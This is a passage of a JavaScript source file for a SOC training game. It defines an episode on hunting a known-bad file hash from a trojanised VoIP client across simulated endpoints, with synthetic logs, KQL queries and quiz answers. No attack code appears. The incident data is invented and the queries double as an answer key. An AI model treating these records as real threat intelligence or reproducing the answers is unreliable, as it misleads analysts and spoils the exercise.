    { chapter: 'timeline', prompt: 'What limitation does the intelligence note about correlation?', teach: 'Timelines are only as reliable as the clocks behind them. The intel record warns that drift between systems can misorder events — always sanity-check timestamps when building a cross-source story.', query: `ThreatIntel | where Indicator == "${AT.ips.c2}"`, column: 'Limitation', hint: 'Read the Limitation on the intel record.' },
    { chapter: 'timeline', prompt: 'Which host was isolated in response?', teach: 'The normalised timeline points to one patient-zero host. Isolating it is the containment that the cross-source reconstruction justified.', query: 'ResponseActions | where Action == "IsolateDevice" and IncidentId == "IR-0329"', column: 'Target', hint: 'Find the IsolateDevice action and read its target.' },
    { chapter: 'timeline', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID anchors the normalised timeline and its response, so the whole reconstruction can be reviewed together.', query: 'ResponseActions | where Action == "IsolateDevice" and IncidentId == "IR-0329"', column: 'IncidentId', hint: 'Read IncidentId on the isolation action.' },
  ],
});

// ── Episode 32 · The Matching Hash ──────────────────────────────────────────────────────────────
const EP32_BAD_HASH = 'a1b2c3d4e5f6-malicious-voip-update';
const EP32_HOSTS = ['HF-SAL-003', 'HF-SUP-007', 'HF-ENG-005'];

export const ep32 = defineCasebook({
  id: 'casebook-s1e32-matching-hash',
  episode: 32,
  title: 'The Matching Hash',
  difficulty: 'Medium',
  replaces: 'siem-chronicle-threat-intel-ioc-match',
  inspiredBy: 'hunting a known-malicious file hash from a threat-intel feed across the fleet',
  date: '2027-04-05',
  briefing: 'A threat-intel feed just published indicators for a compromised version of a popular VoIP client — including a file hash. The question for the SOC is simple but urgent: did that exact file land on any Halcyon machine? This is indicator hunting: take an IOC and sweep the estate. Find the matches, see what they did, and contain them.',
  chapters: [
    { id: 'intel', title: 'The indicator' },
    { id: 'hunt', title: 'The sweep' },
    { id: 'response', title: 'Contain the matches' },
  ],
  inject(t, when) {
    t.add('ThreatIntel', when(0, '08:00:00'), { Indicator: EP32_BAD_HASH, IndicatorType: 'sha256', Actor: GH.name, Confidence: 'High', Source: 'Vendor supply-chain advisory', Limitation: 'A hash match confirms the known-bad file is present; absence of a match does not rule out a different trojanised build.' });
    EP32_HOSTS.forEach((host, i) => {
      t.add('FileEvents', when(0, `09:${String(10 + i).padStart(2, '0')}:00`), { DeviceName: host, AccountName: 'user', ActionType: 'FileCreated', FileName: 'voipclient-setup.exe', FolderPath: 'C:\\Users\\user\\Downloads', SizeBytes: 44_000_000, SHA256: EP32_BAD_HASH });
      t.add('ProcessEvents', when(0, `09:${String(20 + i).padStart(2, '0')}:00`), { DeviceName: host, AccountName: 'user', ProcessName: 'voipclient.exe', ParentProcessName: 'explorer.exe', CommandLine: 'voipclient.exe', SHA256: EP32_BAD_HASH });
      t.add('NetworkEvents', when(0, `09:${String(25 + i).padStart(2, '0')}:00`), { DeviceName: host, InitiatingProcessFileName: 'voipclient.exe', RemoteIP: GH.ips.c2, RemotePort: 443, RemoteUrl: GH.domains.c2, ActionType: 'ConnectionSuccess', BytesSent: 1500 });
    });
    t.add('SecurityAlerts', when(0, '10:00:00'), { AlertName: 'Known-bad VoIP client hash observed on endpoints', Severity: 'High', DeviceName: EP32_HOSTS[0], Entity: 'fleet', Status: 'New', Product: 'Halcyon EDR' });
    EP32_HOSTS.forEach((host) => t.add('ResponseActions', when(0, '10:30:00'), { IncidentId: 'IR-0405', Target: host, Action: 'IsolateDevice', Result: 'Success', ApprovedBy: 'soc-lead' }));
    t.add('ResponseActions', when(0, '10:40:00'), { IncidentId: 'IR-0405', Target: GH.domains.c2, Action: 'BlockIndicator', Result: 'Success', ApprovedBy: 'soc-lead' });
    t.add('ResponseActions', when(0, '11:00:00'), { IncidentId: 'IR-0405', Target: 'voipclient-setup.exe', Action: 'AddBlocklistHash', Result: 'Success', ApprovedBy: 'security-eng' });
  },
  questions: [
    { chapter: 'intel', prompt: 'What type of indicator did the feed publish for the bad file?', teach: 'Threat intel comes in indicator types — hashes, IPs, domains. A file hash is the most precise: it identifies one exact file. Knowing the type tells you which log field to hunt in.', query: `ThreatIntel | where Indicator == "${EP32_BAD_HASH}"`, column: 'IndicatorType', hint: 'Read IndicatorType on the intel record.' },
    { chapter: 'intel', prompt: 'Which actor is the indicator attributed to?', teach: 'Attribution frames the threat — a known espionage actor via a supply-chain advisory. The caveat matters: a hash match proves presence, but no match does not prove safety.', query: `ThreatIntel | where Indicator == "${EP32_BAD_HASH}"`, column: 'Actor', hint: 'Read Actor on the intel record.' },
    { chapter: 'hunt', prompt: 'On how many devices was a file with the bad hash created?', teach: 'This is the sweep: take the hash and search file events across the estate. Counting distinct devices with the matching SHA256 answers the urgent question — how far did it spread?', query: `FileEvents | where SHA256 == "${EP32_BAD_HASH}" | summarize dcount(DeviceName)`, column: 'dcount_DeviceName', hint: 'dcount(DeviceName) for the bad hash in FileEvents.', type: 'number' },
    { chapter: 'hunt', prompt: 'What filename does the bad hash correspond to?', teach: 'The same bad file may be renamed, but the hash is constant. Reading the filename from a matching event tells responders what to look for by name on systems without hash logging.', query: `FileEvents | where SHA256 == "${EP32_BAD_HASH}" | distinct FileName`, column: 'FileName', hint: 'distinct FileName for the bad hash.' },
    { chapter: 'hunt', prompt: 'How many devices actually ran the trojanised client?', teach: 'A file present is not a file executed. Counting distinct devices where the bad-hash process ran separates "downloaded" from "detonated" — the machines that need urgent containment.', query: `ProcessEvents | where SHA256 == "${EP32_BAD_HASH}" | summarize dcount(DeviceName)`, column: 'dcount_DeviceName', hint: 'dcount(DeviceName) for the bad hash in ProcessEvents.', type: 'number' },
    { chapter: 'hunt', prompt: 'Which C2 domain did the trojanised client contact?', teach: 'The malicious client beacons out once run. The destination domain is a new indicator to block and confirms the file is actively malicious, not just flagged.', query: 'NetworkEvents | where InitiatingProcessFileName == "voipclient.exe" | distinct RemoteUrl', column: 'RemoteUrl', hint: 'distinct RemoteUrl on the client’s connections.' },
    { chapter: 'response', prompt: 'How many devices were isolated?', teach: 'Isolation targets every host that ran the trojanised client. Matching the count to the execution set confirms full containment.', query: 'ResponseActions | where IncidentId == "IR-0405" and Action == "IsolateDevice" | count', column: 'Count', hint: 'Count IsolateDevice actions in this incident.', type: 'number' },
    { chapter: 'response', prompt: 'Which action prevents the file from running anywhere else? Enter the response action name.', teach: 'Blocklisting the hash fleet-wide means the known-bad file cannot execute on any machine, even ones that download it later — turning the IOC into a durable control.', query: 'ResponseActions | where Target == "voipclient-setup.exe"', column: 'Action', hint: 'Find the response action targeting the installer.' },
    { chapter: 'response', prompt: 'What limitation does the intelligence note about non-matches?', teach: 'A clean sweep is reassuring but not conclusive: a different trojanised build with a different hash would not match. State that absence of a match is not proof of safety.', query: `ThreatIntel | where Indicator == "${EP32_BAD_HASH}"`, column: 'Limitation', hint: 'Read the Limitation on the intel record.' },
    { chapter: 'response', prompt: 'Which incident ID tracks the response?', teach: 'One incident ID groups the isolations, the domain block and the hash blocklist into a single reviewable hunt-and-contain operation.', query: 'ResponseActions | where Action == "AddBlocklistHash"', column: 'IncidentId', hint: 'Read IncidentId on the blocklist action.' },
  ],
});
